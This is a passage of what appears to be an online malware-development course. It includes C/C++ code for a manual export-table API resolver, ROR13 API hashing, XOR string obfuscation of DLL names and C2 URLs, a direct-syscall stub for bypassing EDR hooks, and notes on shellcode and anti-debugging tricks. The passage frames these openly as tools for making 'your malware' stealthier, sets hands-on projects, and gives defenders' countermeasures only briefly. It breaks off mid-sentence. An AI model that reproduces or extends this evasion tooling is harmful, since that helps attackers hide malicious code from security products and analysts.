(WORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNameOrdinals);\n\n    // 10. Iterate through the array of function names\n    for (DWORD i = 0; i &lt; exportDirectory-&gt;NumberOfNames; i++) {\n        // Get the RVA of the current function name string\n        DWORD nameRVA = addressOfNames[i];\n        // Calculate the address of the function name string\n        char* functionName = (char*)((BYTE*)hModule + nameRVA);\n\n        // 11. Compare the current function name with the target name\n        if (strcmp(functionName, lpProcName) == 0) {\n            // 12. If names match, get the ordinal from the ordinal array\n            WORD ordinal = addressOfNameOrdinals[i];\n\n            // Get the RVA of the function&#39;s entry point from the address array\n            DWORD functionRVA = addressOfFunctions[ordinal];\n\n            // Check for forwarded exports (RVA points inside the export directory itself)\n            // This is a basic check; a full implementation would parse the forwarder string\n            // For this module, we&#39;ll assume non-forwarded functions or handle specific ones\n            // by resolving the target directly (e.g., ntdll!NtCreateThreadEx)\n             if (functionRVA &gt;= dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress &amp;&amp;\n                functionRVA &lt; dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)\n            {\n                 // This RVA points into the export directory, likely a forwarder string.\n                 // We are not handling forwarders in this basic implementation.\n                 // You would typically read the string here and resolve the target.\n                 fprintf(stderr, &quot;Warning: Function &#39;%s&#39; appears to be a forwarder. Not resolved.\\n&quot;, lpProcName);\n                 return NULL; // Or implement forwarder resolution\n            }\n\n            // Calculate the function&#39;s virtual address\n            void* functionAddress = (void*)((BYTE*)hModule + functionRVA);\n\n            // Return the function address\n            return functionAddress;\n        }\n    }\n\n    // 13. Function not found by name\n    fprintf(stderr, &quot;Error: Function &#39;%s&#39; not found in module exports.\\n&quot;, lpProcName);\n    return NULL;\n}\n\n// --- Example Usage ---\nint main() {\n    // For demonstration in this module, we&#39;ll use GetModuleHandleA to get the base address.\n    // In a true stealth scenario, you would find module base addresses manually (e.g., via PEB walk).\n    HMODULE hKernel32 = GetModuleHandleA(&quot;kernel32.dll&quot;);\n\n    if (!hKernel32) {\n        fprintf(stderr, &quot;Error: Could not get handle for kernel32.dll\\n&quot;);\n        return 1;\n    }\n\n    printf(&quot;kernel32.dll base address: %p\\n&quot;, hKernel32);\n\n    // Try resolving a standard WinAPI function\n    const char* funcName = &quot;CreateProcessA&quot;;\n    void* pfnCreateProcessA = ManualGetProcAddress(hKernel32, funcName);\n\n    if (pfnCreateProcessA) {\n        printf(&quot;Resolved address of %s: %p\\n&quot;, funcName, pfnCreateProcessA);\n\n        // You could now cast pfnCreateProcessA to the correct function pointer type\n        // and call it, e.g.:\n        // typedef BOOL (WINAPI* fnCreateProcessA)(\n        //    LPCSTR                lpApplicationName,\n        //    LPSTR                 lpCommandLine,\n        //    LPSECURITY_ATTRIBUTES lpProcessAttributes,\n        //    LPSECURITY_ATTRIBUTES lpThreadAttributes,\n        //    BOOL                  bInheritHandles,\n        //    DWORD                 dwCreationFlags,\n        //    LPVOID                lpEnvironment,\n        //    LPCSTR                lpCurrentDirectory,\n        //    LPSTARTUPINFOA        lpStartupInfo,\n        //    LPPROCESS_INFORMATION lpProcessInformation\n        // );\n        // fnCreateProcessA pfn = (fnCreateProcessA)pfnCreateProcessA;\n        // ... use pfn to call CreateProcessA ...\n\n    } else {\n        fprintf(stderr, &quot;Failed to resolve %s\\n&quot;, funcName);\n    }\n\n     // Try resolving another function\n    const char* funcName2 = &quot;VirtualAllocEx&quot;;\n    void* pfnVirtualAllocEx = ManualGetProcAddress(hKernel32, funcName2);\n\n    if (pfnVirtualAllocEx) {\n        printf(&quot;Resolved address of %s: %p\\n&quot;, funcName2, pfnVirtualAllocEx);\n    } else {\n        fprintf(stderr, &quot;Failed to resolve %s\\n&quot;, funcName2);\n    }\n\n    // Try resolving a function that might not exist or be exported by name\n    const char* funcName3 = &quot;NonExistentFunction&quot;;\n     void* pfnNonExistent = ManualGetProcAddress(hKernel32, funcName3);\n\n    if (pfnNonExistent) {\n        printf(&quot;Resolved address of %s: %p\\n&quot;, funcName3, pfnNonExistent);\n    } else {\n        fprintf(stderr, &quot;Failed to resolve %s (Expected failure)\\n&quot;, funcName3);\n    }\n\n    // Note: For resolving NTAPI functions like NtAllocateVirtualMemory,\n    // you would typically get the handle for &quot;ntdll.dll&quot; and parse its exports.\n    // HMODULE hNtdll = GetModuleHandleA(&quot;ntdll.dll&quot;);\n    // void* pfnNtAllocateVirtualMemory = ManualGetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);\n    // ...\n\n    return 0;\n}\n</code></pre>\n<p><strong>Explanation of the Code:</strong></p>\n<ol>\n<li><strong>Includes:</strong> We need <code>windows.h</code> for basic Windows types, <code>winternl.h</code> for the PE structure definitions (like <code>IMAGE_NT_HEADERS</code>, <code>IMAGE_EXPORT_DIRECTORY</code>, etc.), and standard C headers for printing and string comparison.</li>\n<li><strong>Structure Definitions:</strong> We include checks for <code>IMAGE_NT_SIGNATURE</code> and <code>IMAGE_DOS_SIGNATURE</code> in case <code>winternl.h</code> or the environment doesn&#39;t define them, but typically, these are standard. <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> is defined as 0, representing the first entry in the Data Directory.</li>\n<li><strong><code>ManualGetProcAddress</code> Function:</strong><ul>\n<li>Takes <code>hModule</code> (the base address of the DLL/EXE) and <code>lpProcName</code> (the name string) as input.</li>\n<li>Uses pointer arithmetic (<code>(BYTE*)hModule + offset</code>) to navigate through the PE structure in memory. Remember, <code>hModule</code> is the base, and RVAs are offsets <em>from that base</em>.</li>\n<li>Performs validation checks (<code>e_magic</code>, <code>Signature</code>, <code>Export Directory Size &gt; 0</code>) at each major step. Robust code <em>always</em> validates!</li>\n<li>Calculates the addresses of the <code>IMAGE_EXPORT_DIRECTORY</code> and the three associated arrays (<code>AddressOfFunctions</code>, <code>AddressOfNames</code>, <code>AddressOfNameOrdinals</code>) by adding their RVAs to the module base.</li>\n<li>Loops through the <code>AddressOfNames</code> array.</li>\n<li>Inside the loop, it calculates the address of each exported function&#39;s name string and uses <code>strcmp</code> to compare it to the target name.</li>\n<li>If a match is found, it uses the corresponding entry in <code>AddressOfNameOrdinals</code> to get the function&#39;s ordinal.</li>\n<li>It then uses the ordinal as an index into the <code>AddressOfFunctions</code> (EAT) to get the function&#39;s RVA.</li>\n<li>A basic check is added for forwarders (if the RVA points back into the export directory range). For this module, we&#39;re just printing a warning and returning NULL for simplicity, but a real-world resolver would handle this recursively.</li>\n<li>Finally, it calculates the function&#39;s absolute virtual address by adding the function RVA to the module base address and returns it as a <code>void*</code>.</li>\n<li>If the loop finishes without finding the name, it returns <code>NULL</code>.</li>\n</ul>\n</li>\n<li><strong><code>main</code> Function (Example Usage):</strong><ul>\n<li>For demonstration <em>in this module</em>, we use <code>GetModuleHandleA(&quot;kernel32.dll&quot;)</code> to get the base address of <code>kernel32.dll</code>. <strong>Crucially, in a truly stealthy tool, you would NOT use <code>GetModuleHandleA</code> as it&#39;s a static import itself!</strong> We will discuss how to find module bases manually in the next module (PEB walk).</li>\n<li>It calls our <code>ManualGetProcAddress</code> function to resolve <code>CreateProcessA</code> and <code>VirtualAllocEx</code>.</li>\n<li>It prints the resolved addresses.</li>\n<li>It includes commented-out code showing how you would cast the returned <code>void*</code> to a function pointer type to actually call the function.</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome back! We&#39;ve come a long way from just understanding process basics. In Module 6, we cracked open the PE format and learned how to find API function addresses manually at runtime. That was a massive leap towards stealth, getting rid of those tell-tale static imports.</p>\n<p>But guess what? We can go deeper! While manually parsing the EAT is great, if our code still contains the <em>literal strings</em> &quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot;, &quot;CreateRemoteThread&quot;, etc., static analysis tools or even simple memory scanners looking for known API names can still flag our payload.</p>\n<p>This module is all about <em>hiding</em> our intentions and the tools we&#39;re using. We&#39;re going to make it much harder for defenders to see which APIs we&#39;re calling and even make our code&#39;s structure less obvious. We&#39;ll draw inspiration from some nasty real-world malware and the principles laid out in texts like <code>zhasslan.txt</code> ‚Äì the idea of obscuring your code&#39;s purpose and execution flow.</p>\n<p>Get ready to dive into API hashing, string obfuscation, and a brief peek into the world of direct syscalls.</p>\n<hr>\n<h2><strong>Module 7: Advanced Evasion - Hiding API Calls and Other Techniques</strong></h2>\n<ul>\n<li><strong>Module Objective:</strong> Implement advanced techniques to further obscure the use of system APIs and the presence of malicious code, including hashing API names, string obfuscation, and understanding the role of direct syscalls.</li>\n</ul>\n<hr>\n<h3><strong>7.1 The Problem with Cleartext API Names</strong></h3>\n<p>Let&#39;s quickly recap Module 6. We learned to do this:</p>\n<ol>\n<li>Get the base address of a loaded module (like <code>kernel32.dll</code>).</li>\n<li>Manually parse its PE header to find the Export Directory.</li>\n<li>Iterate through the exported function names.</li>\n<li>Compare the name string from the EAT with the name string of the function we want (e.g., &quot;VirtualAllocEx&quot;).</li>\n<li>If they match, calculate the function&#39;s address using the EAT data.</li>\n</ol>\n<p>This successfully avoids having &quot;VirtualAllocEx&quot; in our Import Address Table (IAT). <em>However</em>, the string &quot;VirtualAllocEx&quot; (or &quot;kernel32.dll&quot;) likely still exists <em>somewhere</em> in our code or data section, because we need it as input to our custom <code>GetProcAddress</code>-like function.</p>\n<p>Security tools perform static analysis. They scan executable files and memory for patterns. Literal strings referencing sensitive APIs are <em>strong</em> indicators of potentially malicious activity. Even if you&#39;re dynamically resolving, if the string &quot;NtAllocateVirtualMemory&quot; is sitting there waiting to be looked up, it&#39;s a red flag.</p>\n<p>Our goal in evasion is to break these static patterns and make the code harder to understand without dynamic execution and often, complex runtime analysis.</p>\n<h3><strong>7.2 Improving Dynamic Resolution: API Hashing</strong></h3>\n<p>The solution to the cleartext string problem is <strong>API Hashing</strong>. Instead of searching the EAT for a <em>string</em> match, we search for a <em>hash</em> match.</p>\n<p>Here&#39;s the concept:</p>\n<ol>\n<li>We decide on a simple, fast hashing algorithm.</li>\n<li>When we want to look up a function (say, <code>VirtualAllocEx</code>), we calculate the hash of &quot;VirtualAllocEx&quot; <em>at compile time</em> or store a pre-calculated hash value.</li>\n<li>Our dynamic resolution function now takes this <em>hash value</em> as input, instead of the string name.</li>\n<li>Inside the dynamic resolution function (our custom <code>GetProcAddress</code>), as we iterate through the EAT&#39;s exported names, we calculate the hash of <em>each exported name</em> we encounter.</li>\n<li>We compare this calculated hash with the target hash provided as input.</li>\n<li>If the hashes match, we&#39;ve found our function! We return its address.</li>\n</ol>\n<p>Now, the string &quot;VirtualAllocEx&quot; never needs to appear in our code&#39;s static form. Only the <em>hash value</em> does, which is just a number and much less suspicious than the string itself.</p>\n<h4><strong>Choosing a Hashing Algorithm</strong></h4>\n<p>For malware and shellcode, the hashing algorithm needs to be:</p>\n<ul>\n<li><strong>Simple and Fast:</strong> It will be executed repeatedly during the EAT traversal. Complex algorithms add overhead.</li>\n<li><strong>Small Code Size:</strong> Especially critical for shellcode where every byte counts.</li>\n<li><strong>Reasonably Unique:</strong> While collisions are possible with simple hashes, they should be rare enough for typical API sets.</li>\n</ul>\n<p>Common choices include:</p>\n<ul>\n<li><strong>ROR13 (Rotate Right by 13):</strong> A very simple and widely used hash in malware. It iterates through the string, rotating a running hash value right by 13 bits and adding the current character.</li>\n<li><strong>DJB2:</strong> Another simple, non-cryptographic hash.</li>\n</ul>\n<p>Let&#39;s implement a basic ROR13 hash function as an example.</p>\n<pre><code class=\"language-c++\">#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n\n// Simple ROR13 hash function\nDWORD ROR13Hash(const char* name) {\n    DWORD hash = 0;\n    while (*name) {\n        // Rotate right by 13 bits\n        hash = (hash &gt;&gt; 13) | (hash &lt;&lt; (32 - 13));\n        // Add the current character (case-insensitive for API names)\n        hash += static_cast&lt;DWORD&gt;(*name);\n        name++;\n    }\n    return hash;\n}\n\nint main() {\n    // Example usage\n    const char* apiName1 = &quot;VirtualAllocEx&quot;;\n    const char* apiName2 = &quot;WriteProcessMemory&quot;;\n    const char* dllName1 = &quot;kernel32.dll&quot;;\n\n    DWORD hash1 = ROR13Hash(apiName1);\n    DWORD hash2 = ROR13Hash(apiName2);\n    DWORD hash3 = ROR13Hash(dllName1);\n\n    std::cout &lt;&lt; &quot;Hash of &quot; &lt;&lt; apiName1 &lt;&lt; &quot;: &quot; &lt;&lt; std::hex &lt;&lt; hash1 &lt;&lt; std::endl;\n    std::cout &lt;&lt; &quot;Hash of &quot; &lt;&lt; apiName2 &lt;&lt; &quot;: &quot; &lt;&lt; std::hex &lt;&lt; hash2 &lt;&lt; std::endl;\n    std::cout &lt;&lt; &quot;Hash of &quot; &lt;&lt; dllName1 &lt;&lt; &quot;: &quot; &lt;&lt; std::hex &lt;&lt; hash3 &lt;&lt; std::endl;\n\n    // Note: In real malware, these hashes would be hardcoded or calculated at compile time\n    // and the strings wouldn&#39;t appear like this.\n\n    return 0;\n}\n</code></pre>\n<p><em>(<strong>Self-Correction/Refinement:</strong> The ROR13 hash implementation above is slightly simplified for clarity. A more common variant uses <code>hash = (hash &lt;&lt; 13) | (hash &gt;&gt; (32 - 13))</code> for ROL13, or uses <code>hash = (hash &gt;&gt; 13) | (hash &lt;&lt; (32 - 13)); hash ^= *name;</code> or similar variations. The core idea remains: a simple bitwise operation and addition/XOR per character. Let&#39;s stick with the provided <code>ROR13Hash</code> as it demonstrates the principle clearly for teaching purposes. The key is that <em>some</em> deterministic hash is used.)</em></p>\n<h4><strong>Integrating Hashing into Dynamic Resolution</strong></h4>\n<p>Now, let&#39;s think about how this changes our <code>GetProcAddress</code>-like function from Module 6.</p>\n<p><strong>Module 6 (Conceptual <code>GetProcAddress</code>):</strong></p>\n<pre><code class=\"language-c++\">// Simplified Pseudocode\nLPVOID CustomGetProcAddress(LPVOID moduleBase, const char* functionName) {\n    // 1. Validate PE header\n    // 2. Find Export Directory RVA\n    // 3. Get AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals arrays\n    // 4. Loop through names:\n    //    For each name_rva in AddressOfNames:\n    //        char* currentName = moduleBase + name_rva;\n    //        If strcmp(currentName, functionName) == 0: // &lt;--- String comparison\n    //            // Found it! Get ordinal and then function address\n    //            DWORD ordinal = AddressOfNameOrdinals[i]; // i is index in names array\n    //            LPVOID functionAddress = moduleBase + AddressOfFunctions[ordinal];\n    //            return functionAddress;\n    // 5. Return NULL if not found\n}\n\n// Usage:\n// LPVOID pVirtualAllocEx = CustomGetProcAddress(hKernel32, &quot;VirtualAllocEx&quot;);\n</code></pre>\n<p><strong>Module 7 (Conceptual Hash-Based <code>GetProcAddress</code>):</strong></p>\n<pre><code class=\"language-c++\">// Simplified Pseudocode\nLPVOID CustomGetProcAddressByHash(LPVOID moduleBase, DWORD functionHash) {\n    // 1. Validate PE header\n    // 2. Find Export Directory RVA\n    // 3. Get AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals arrays\n    // 4. Loop through names:\n    //    For each name_rva in AddressOfNames:\n    //        char* currentName = moduleBase + name_rva;\n    //        DWORD currentNameHash = ROR13Hash(currentName); // &lt;--- Hash calculation\n    //        If currentNameHash == functionHash: // &lt;--- Hash comparison\n    //            // Found it! Get ordinal and then function address\n    //            DWORD ordinal = AddressOfNameOrdinals[i]; // i is index in names array\n    //            LPVOID functionAddress = moduleBase + AddressOfFunctions[ordinal];\n    //            return functionAddress;\n    // 5. Return NULL if not found\n}\n\n// Usage:\n// DWORD virtualAllocExHash = 0x????????; // Pre-calculated hash\n// LPVOID pVirtualAllocEx = CustomGetProcAddressByHash(hKernel32, virtualAllocExHash);\n</code></pre>\n<p>This simple change means the literal string &quot;VirtualAllocEx&quot; is no longer needed at runtime lookup. It significantly hinders static analysis.</p>\n<p><strong>Project Task Connection:</strong> Your Module 7 project will modify your Module 6 code to implement this hash-based lookup. You&#39;ll need to decide on a hashing algorithm and integrate it into your PE parsing logic.</p>\n<h3><strong>7.3 String Obfuscation</strong></h3>\n<p>API hashing hides the <em>function names</em> during lookup. But what about the <em>DLL names</em> (&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;)? And what about the strings representing the <em>hashes</em> themselves (if they were stored as hex strings)? And what about other potentially interesting strings in your payload (like command-and-control server addresses, file paths, mutex names)?</p>\n<p>This is where <strong>String Obfuscation</strong> comes in. The goal is to prevent static analysis tools from easily identifying strings within your executable file.</p>\n<p>Simple techniques involve encoding the strings using a key (like XOR) and decoding them at runtime just before they are used.</p>\n<h4><strong>Simple XOR Obfuscation</strong></h4>\n<p>XOR is a common choice because it&#39;s simple, reversible (XORing with the same key twice returns the original value), and fast.</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;string&gt;\n\n// Function to XOR a buffer with a single byte key\nvoid XORBuffer(char* data, size_t size, char key) {\n    for (size_t i = 0; i &lt; size; ++i) {\n        data[i] ^= key;\n    }\n}\n\n// Example of how you might use it (simplified)\n// In real code, the encoded_string would be defined directly with bytes\n// and the decoding would happen at runtime.\nint main() {\n    const char* original_string = &quot;kernel32.dll&quot;;\n    char key = 0x55; // Our XOR key\n\n    // --- Compile-time or preparation step ---\n    // In a real scenario, you&#39;d compute these encoded bytes\n    // using a separate script or build process.\n    std::vector&lt;char&gt; encoded_bytes(original_string, original_string + strlen(original_string) + 1); // +1 for null terminator\n    XORBuffer(encoded_bytes.data(), encoded_bytes.size(), key);\n\n    // To see the encoded bytes (what would go in your source code)\n    std::cout &lt;&lt; &quot;Encoded bytes (hex): &quot;;\n    for (char byte : encoded_bytes) {\n        // Print byte as unsigned hex to avoid sign issues\n        printf(&quot;%02X &quot;, static_cast&lt;unsigned char&gt;(byte));\n    }\n    std::cout &lt;&lt; std::endl;\n\n    // --- Runtime step (what your malware code would do) ---\n    // Imagine &#39;encoded_string_in_memory&#39; is the byte array from above\n    char encoded_string_in_memory[] = { /* ... your encoded bytes ... */ }; // Replace with actual encoded bytes\n    // Example using the bytes from the vector:\n    char runtime_string[100]; // Make sure buffer is large enough\n    memcpy(runtime_string, encoded_bytes.data(), encoded_bytes.size());\n\n\n    // Decode the string at runtime before use\n    XORBuffer(runtime_string, encoded_bytes.size(), key); // Decode\n\n    std::cout &lt;&lt; &quot;Decoded string: &quot; &lt;&lt; runtime_string &lt;&lt; std::endl;\n\n    // Now you can use runtime_string (e.g., pass it to LoadLibrary or your hash function)\n\n    return 0;\n}\n</code></pre>\n<p><em>(<strong>Note:</strong> In actual malware development, you wouldn&#39;t typically use <code>std::vector</code> or <code>std::string</code> in your low-level loader code, as these introduce dependencies. You would define the encoded bytes directly in a byte array <code>char encoded_dll[] = { 0xXX, 0xYY, ... };</code> and use a raw pointer and loop for decoding. The example above uses vector/string for simpler demonstration.)</em></p>\n<h4><strong>Applying String Obfuscation</strong></h4>\n<p>You would apply this to:</p>\n<ol>\n<li><strong>DLL Names:</strong> Obfuscate &quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;, etc. Decode them just before calling <code>LoadLibraryA</code>/<code>LdrGetDllHandle</code> or before passing them to your custom module base finding logic (if you&#39;re not using <code>GetModuleHandle</code>).</li>\n<li><strong>API Hashes (if needed):</strong> If you store hashes as strings (e.g., &quot;0x1234ABCD&quot;), obfuscate those too. More commonly, hashes are stored directly as <code>DWORD</code> values, which don&#39;t need string obfuscation, but the <em>code</em> that calculates or uses them might still contain patterns.</li>\n<li><strong>Other Sensitive Strings:</strong> C2 URLs, file paths, registry keys, mutex names, etc.</li>\n</ol>\n<p>By combining API hashing and string obfuscation, you make it significantly harder for static analysis to determine which APIs are being called or what resources the malware interacts with. This forces analysts to rely more on dynamic analysis (running the code in a debugger or sandbox), which introduces its own challenges (like anti-analysis checks, which we&#39;ll touch on later).</p>\n<p><strong>Project Task Connection:</strong> Your Module 7 project will implement a simple string obfuscation routine (like XOR) and use it to hide at least the names &quot;kernel32.dll&quot; and &quot;ntdll.dll&quot; within your code. You&#39;ll decode them at runtime before using them with your (now hash-based) dynamic resolver.</p>\n<h3><strong>7.4 Introduction to Direct System Calls (Syscalls)</strong></h3>\n<p>This is an advanced topic, but it&#39;s essential to understand the concept as it&#39;s a prevalent evasion technique in modern malware.</p>\n<p><strong>The Problem:</strong> Even if you use dynamic API resolution and obfuscate strings, you are still eventually calling functions within user-mode DLLs like <code>ntdll.dll</code> (e.g., <code>NtAllocateVirtualMemory</code>, <code>NtCreateThreadEx</code>). Security products, especially Endpoint Detection and Response (EDR) systems, heavily rely on hooking functions in user-mode DLLs like <code>ntdll.dll</code> and <code>kernel32.dll</code> to monitor process behavior. When your code calls <code>NtAllocateVirtualMemory</code>, the EDR&#39;s hook gets executed, logs the call, inspects the arguments, and potentially blocks it.</p>\n<p><strong>The Solution: Bypassing User-Mode Hooks via Direct Syscalls.</strong></p>\n<p>Instead of calling the <code>NtAllocateVirtualMemory</code> function exported by <code>ntdll.dll</code> (which is a user-mode wrapper around the actual kernel operation), you can bypass this wrapper and execute the low-level instruction (<code>syscall</code> on x64, <code>sysenter</code> on x86) that transitions from user-mode to kernel-mode to request the operation directly.</p>\n<p>Every Native API function (<code>Nt...</code> or <code>Zw...</code>) in <code>ntdll.dll</code> has a corresponding syscall number. The function stub in <code>ntdll.dll</code> typically just loads the syscall number into a specific register (like <code>EAX</code> on x86 or <code>RAX</code> on x64) and then executes the syscall instruction.</p>\n<p>By implementing your own syscall stub (often in assembly or using compiler intrinsics), you can load the correct syscall number and execute the <code>syscall</code> instruction yourself, completely bypassing the <code>ntdll.dll</code> function&#39;s entry point where the EDR&#39;s hook might be placed.</p>\n<pre><code class=\"language-assembly\">; Example x64 Syscall Stub (Conceptual)\n; For NtAllocateVirtualMemory (Syscall number varies by OS version!)\n; rcx = ProcessHandle\n; rdx = BaseAddress\n; r8  = ZeroBits\n; r9  = RegionSize\n; [rsp+0x20] = AllocationType\n; [rsp+0x28] = Protect\n\nmov rax, &lt;syscall_number_for_NtAllocateVirtualMemory&gt; ; Load syscall number into RAX\nsyscall                                               ; Execute syscall instruction\nret                                                   ; Return to caller\n</code></pre>\n<p><em>(<strong>Note:</strong> This is highly simplified. Parameter passing conventions vary, and finding the correct syscall number dynamically is a complex task often involving parsing <code>ntdll.dll</code> at runtime, looking for specific instruction patterns (the syscall stubs), and extracting the number. Syscall numbers change between Windows versions and even builds, making hardcoding them unreliable.)</em></p>\n<h4><strong>Challenges of Direct Syscalls:</strong></h4>\n<ul>\n<li><strong>OS Version/Build Dependency:</strong> Syscall numbers are not fixed. Code that works on Windows 10 20H2 might break on Windows 11 22H2. Advanced techniques involve dynamically finding syscall numbers at runtime.</li>\n<li><strong>Implementation Complexity:</strong> Requires writing assembly or using compiler intrinsics, understanding calling conventions at the syscall boundary.</li>\n<li><strong>Detection:</strong> While you bypass user-mode hooks, the transition to kernel-mode <em>can</em> still be monitored by kernel-mode security components or hypervisor-based security. Anomalies in syscall parameters or sequences can also be detected. Security products are also getting better at detecting user-mode code that <em>looks</em> like syscall stubs.</li>\n<li><strong>Stability:</strong> Incorrectly preparing parameters or using the wrong syscall number can crash the process or the system.</li>\n</ul>\n<p><strong>Why we&#39;re only introducing it:</strong> Implementing robust, version-agnostic direct syscalls is a significant undertaking that requires deep assembly knowledge and runtime <code>ntdll.dll</code> analysis. It often warrants its own dedicated module or course. However, understanding <em>why</em> attackers use it (bypassing user-mode hooks) is crucial for understanding modern evasion and defense.</p>\n<h3><strong>7.5 Position-Independent Code (PIC)</strong></h3>\n<p>This concept is fundamental for shellcode and injected payloads, although it&#39;s not strictly an <em>evasion</em> technique itself, it&#39;s an <em>enabling</em> technique for stealthy execution in arbitrary memory locations.</p>\n<p><strong>What is PIC?</strong> Position-Independent Code is executable code that can run correctly regardless of the memory address where it is loaded. It doesn&#39;t rely on hardcoded absolute memory addresses for jumps, calls, or data access.</p>\n<p><strong>Why is it Important for Injected Code?</strong> When you allocate memory in a target process (e.g., using <code>VirtualAllocEx</code> or <code>NtAllocateVirtualMemory</code>), you don&#39;t know <em>exactly</em> where that memory block will be. It depends on the target process&#39;s existing memory layout. If your injected code (your shellcode) contains instructions like <code>call 0x12345678</code> or accesses data at <code>mov eax, [0xABCDEF00]</code>, these absolute addresses will be wrong because your code isn&#39;t loaded at its &quot;intended&quot; base address.</p>\n<p>PIC solves this by using relative addressing. Instead of <code>call 0x12345678</code>, it uses <code>call relative_offset_to_target</code>. The CPU calculates the actual target address relative to the current instruction pointer (<code>RIP</code> on x64). Data access uses similar RIP-relative addressing (<code>mov eax, [rip + relative_offset_to_data]</code>).</p>\n<p><strong>How is PIC Achieved?</strong></p>\n<ul>\n<li><strong>Compilers:</strong> Compilers can generate PIC for shared libraries (<code>.dll</code>s) using flags like <code>-fPIC</code> (GCC/Clang) or <code>/DYNAMICBASE</code> and <code>/FIXED:NO</code> (MSVC linker options, though true PIC for <code>.exe</code>-like code is harder).</li>\n<li><strong>Assembly:</strong> Writing shellcode directly in assembly allows precise control over addressing modes (using <code>CALL/POP</code> tricks on x86 or RIP-relative addressing on x64).</li>\n<li><strong>Manual Relocation:</strong> For more complex injected modules (like injecting a full DLL manually), you might implement a mini-loader that performs runtime relocation, fixing up absolute addresses based on the actual load address.</li>\n</ul>\n<p>Your shellcode payload itself (the bytes you allocate and write into the target process) <em>must</em> be PIC. This is why simple C/C++ functions compiled normally are often not suitable directly as shellcode; they contain absolute references that will break. You need to compile them specifically for PIC or write them in assembly.</p>\n<h3><strong>7.6 Simple Code Obfuscation and Anti-Analysis Tricks</strong></h3>\n<p>Beyond hiding API calls and strings, attackers use various techniques to make the code itself harder to reverse engineer and analyze dynamically.</p>\n<ul>\n<li><strong>Junk Code:</strong> Inserting instructions that do nothing functionally but alter the code&#39;s appearance, confusing disassemblers and analysts.</li>\n<li><strong>Control Flow Obfuscation:</strong> Replacing simple <code>if/else</code> or loops with convoluted sequences of jumps, indirect calls, or state-machine-like logic.</li>\n<li><strong>Stack Strings:</strong> Constructing strings on the stack byte by byte at runtime instead of having them in the data section.</li>\n<li><strong>Encoding/Encryption:</strong> Encrypting the main payload and only decrypting it in memory just before execution. The decryption key might be derived at runtime based on environmental factors.</li>\n<li><strong>Simple Anti-Debugging Checks:</strong><ul>\n<li><code>IsDebuggerPresent()</code>: A simple WinAPI call. Easily bypassed but catches the laziest attempts.</li>\n<li>Checking the PEB (<code>Process Environment Block</code>): The <code>BeingDebugged</code> flag is stored here. Accessing the PEB requires understanding OS structures (tying back to Module 1 and <code>zhasslan.txt</code> concepts).</li>\n<li>Timing Checks: Measuring the time between two points. If it takes too long (due to debugger breakpoints or single-stepping), the code might detect analysis.</li>\n<li>Looking for debugger windows or processes.</li>\n</ul>\n</li>\n</ul>\n<p>These techniques add layers of complexity. An analyst hitting obfuscated code or an anti-debugging check has to spend time understanding and bypassing it, slowing down the analysis process.</p>\n<h3><strong>7.7 Case Study Snippet: Emotet/TrickBot Evasion</strong></h3>\n<p>Malware families like Emotet and TrickBot (and their loaders) are notorious for their sophisticated evasion techniques. They frequently employ:</p>\n<ol>\n<li><strong>Heavy API Hashing:</strong> Almost all Windows API calls are resolved via hashing, making static analysis of their imports useless.</li>\n<li><strong>Extensive String Obfuscation:</strong> Configuration data, C2 URLs, injected DLL names, mutex names ‚Äì all are heavily obfuscated, often with multi-layered schemes (XOR, RC4, custom algorithms).</li>\n<li><strong>Dynamic Syscall Resolution:</strong> Newer variants often incorporate techniques to find and use syscalls directly to evade EDR hooks.</li>\n<li><strong>Packed/Encoded Payloads:</strong> The core malicious payload is often encrypted or encoded, only being decrypted in memory by a small, highly obfuscated loader stub.</li>\n<li><strong>Anti-Analysis Checks:</strong> They often include checks for debuggers, sandboxes, and analysis tools.</li>\n</ol>\n<p>These families demonstrate the practical application of the techniques we&#39;re discussing. Their loaders are prime examples of the principles from <code>zhasslan.txt</code> ‚Äì minimizing the static footprint, obscuring control flow, and dynamically resolving everything possible. Analyzing samples from these families (in a safe, isolated environment!) is an excellent way to see these techniques in action.</p>\n<h3><strong>7.8 Defensive Considerations (Briefly)</strong></h3>\n<p>How do defenders counter these techniques?</p>\n<ul>\n<li><strong>Emulation/Execution:</strong> Security products run the initial code in a safe environment (emulator, sandbox) to trigger the decoding and hashing routines and reveal the actual API calls and strings.</li>\n<li><strong>Behavioral Analysis:</strong> Even if API calls are obfuscated, the <em>behavior</em> (allocating executable memory, writing code, creating remote threads/APCs) is often detectable.</li>\n<li><strong>Memory Scanning:</strong> Scanning process memory for known shellcode patterns or decoded strings after the payload has been unpacked/decoded.</li>\n<li><strong>Hooking Deeper:</strong> Attempting to hook syscalls in the kernel (more difficult and risky) or monitoring the syscall instruction itself.</li>\n<li><strong>Heuristics:</strong> Detecting code patterns common in obfuscated code or custom syscall stubs.</li>\n<li><strong>Threat Intelligence:</strong> Sharing hashes of obfuscation routines or specific code patterns observed in the wild.</li>\n</ul>\n<p>It&#39;s a constant arms race! Attackers develop new evasion, defenders develop new detection, and so on. Understanding both sides is key.</p>\n<h3><strong>7.9 Module Project/Exercise: Enhancing Your Resolver with Hashing and Obfuscation</strong></h3>\n<p>Alright, let&#39;s put this into practice. Your task is to take the dynamic API resolver you built in Module 6 and make it stealthier.</p>\n<p><strong>Goal:</strong> Modify your custom <code>GetProcAddress</code>-like function to use API hashing instead of string comparison, and implement string obfuscation for the DLL names.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><strong>Review Module 6 Code:</strong> Get your working code that manually parses the PE Export Directory to find a function address by name.</li>\n<li><strong>Implement a Hashing 